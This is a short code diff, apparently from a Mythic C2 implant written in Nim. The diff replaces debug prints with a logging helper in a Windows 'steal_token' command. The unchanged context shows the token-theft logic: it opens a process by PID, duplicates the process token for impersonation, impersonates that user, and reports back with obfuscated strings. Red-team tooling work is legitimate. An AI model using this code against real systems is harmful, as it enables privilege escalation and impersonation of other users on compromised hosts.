@@ -19,7 +19,7 @@ when defined(windows):
       except:
         return mythicError(taskId, obf("Invalid PID format: ") & pidStr)
       
-      debug &"[DEBUG] steal_token: PID={pid}"
+      debugLog "steal_token", &"steal_token: PID={pid}"
       
       # Open the target process
       let processHandle = OpenProcess(PROCESS_QUERY_INFORMATION, 0, pid.DWORD)
@@ -42,7 +42,7 @@ when defined(windows):
       const SecurityImpersonationLevel = 2.DWORD
       const TokenImpersonationType = 2.DWORD
       
-      debug &"[DEBUG] About to duplicate token with SecurityLevel={SecurityImpersonationLevel}, TokenType={TokenImpersonationType}"
+      debugLog "steal_token", &"About to duplicate token with SecurityLevel={SecurityImpersonationLevel}, TokenType={TokenImpersonationType}"
       
       if DuplicateTokenEx(processToken, MAXIMUM_ALLOWED, nil, SecurityImpersonationLevel, 
                           TokenImpersonationType, addr impersonationToken) == 0:
@@ -74,7 +74,7 @@ when defined(windows):
       # Get the new user context (after impersonation)
       let newUser = getCurrentUsername()
       
-      debug &"[DEBUG] Successfully stole token from PID {pid}: {newUser}"
+      debugLog "steal_token", &"Successfully stole token from PID {pid}: {newUser}"
       
       # Build response with callback data
       return mythicCallback(taskId, obf("Successfully impersonated ") & newUser & obf(" from PID ") & $pid, %*{
